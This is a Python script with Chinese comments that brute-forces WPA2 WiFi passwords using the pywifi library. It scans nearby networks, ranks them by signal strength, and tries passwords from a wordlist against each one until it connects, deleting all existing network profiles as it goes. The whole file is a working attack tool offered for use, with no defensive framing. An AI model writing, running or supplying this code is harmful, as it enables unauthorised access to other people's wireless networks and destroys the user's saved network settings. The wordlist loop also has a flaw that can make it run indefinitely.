import pywifi, time
from pywifi import const
import os




class MyWifiCrack(object):
    def __init__(self, wireless, profile):
        # 有可能有多个无线网卡,所以要指定第一个无线网卡
        self.wireless = wireless
        self.profile = profile
        self.profile.auth = const.AUTH_ALG_OPEN  # 需要密码
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元

        self.ispassword = False

    def wifi_connect_status(self):
        """
        判断本机是否有无线网卡,以及连接状态
        :return: 已连接或存在无线网卡返回1,否则返回0
        """
        if self.wireless.status() in [const.IFACE_CONNECTED, const.IFACE_INACTIVE]:
            print('wifi已连接')
            return 1
        else:
            print('wifi未连接')
            return 0

    def scan_wifi(self):
        """
        扫苗附件wifi
        :return: 信号强的wifi 对象列表
        """
        self.wireless.scan() #扫苗附件wifi
        time.sleep(1)
        wifi_lists = []
        allwifi = self.wireless.scan_results()
        for i in allwifi:
            print('wifi扫苗结果:{}'.format(i.ssid)) # ssid 为wifi名称
            print('wifi设备MAC地址:{}'.format(i.bssid))
            print('wifi信号强度:{}'.format(i.signal))
            if -50 < i.signal < 0:
                wifi_lists.append(i) # 加入信号强的wifi对象
        # 按照信号强度排列附近WiFi 对象
        wifi_lists.sort(key=lambda x: x.signal, reverse=True)

        return wifi_lists


    def connect_wifi(self):
        
        self.wireless.remove_all_network_profiles()  # 删除其他配置文件
        tmp_profile = self.wireless.add_network_profile(self.profile)  # 加载配置文件
        self.wireless.connect(tmp_profile)  # 连接
        time.sleep(10)  # 尝试10秒能否成功连接
        
        if self.wireless.status() == const.IFACE_CONNECTED:
            print("成功连接")
            self.ispassword = True
        else:
            print("失败")
        #ifaces.disconnect()  # 断开连接
        time.sleep(1)
        


    def run_password_filepath(self, password_filepath):
        if self.wifi_connect_status() == 0:
            wifi_lists = self.scan_wifi()
            for every_wifi in wifi_lists:
                self.profile.ssid = every_wifi.ssid
                with open(password_filepath, 'r') as fr:
                    while not self.ispassword:
                        self.profile.key = fr.readline()
                        self.connect_wifi()
                        

    def run_password_lists(self, password_lists):
        if self.wifi_connect_status() == 0:
            wifi_lists = self.scan_wifi()
            for every_wifi in wifi_lists:
                self.profile.ssid = every_wifi.ssid
                for pd in password_lists:
                    self.profile.key = pd
                    self.connect_wifi()
                    if self.ispassword:
                        break
    
    def run_password_str(self, password_str, wifi_ssid=''):
        if self.wifi_connect_status() == 0:
            if wifi_ssid == '':
                wifi_lists = self.scan_wifi()
                for every_wifi in wifi_lists:
                    self.profile.ssid = every_wifi.ssid
                    self.profile.key = password_str
                    self.connect_wifi()
                    if self.ispassword:
                        break
            else:
                self.profile.ssid = wifi_ssid
                self.profile.key = password_str
                self.connect_wifi()
                

if __name__ == "__main__":
    wifi_obj = pywifi.PyWiFi()
    wireless_lists = wifi_obj.interfaces()
    if wireless_lists != []:
        wireless_obj = wireless_lists[0]
        profile_obj = pywifi.Profile()
        base_password_filepath = os.path.join(os.path.split(__file__)[0], 'new_password_lists.txt')
        wifi_crack = MyWifiCrack(wireless_obj, profile_obj)
        wifi_crack.run_password_filepath(base_password_filepath)
    else:
        print('没有无线网卡')
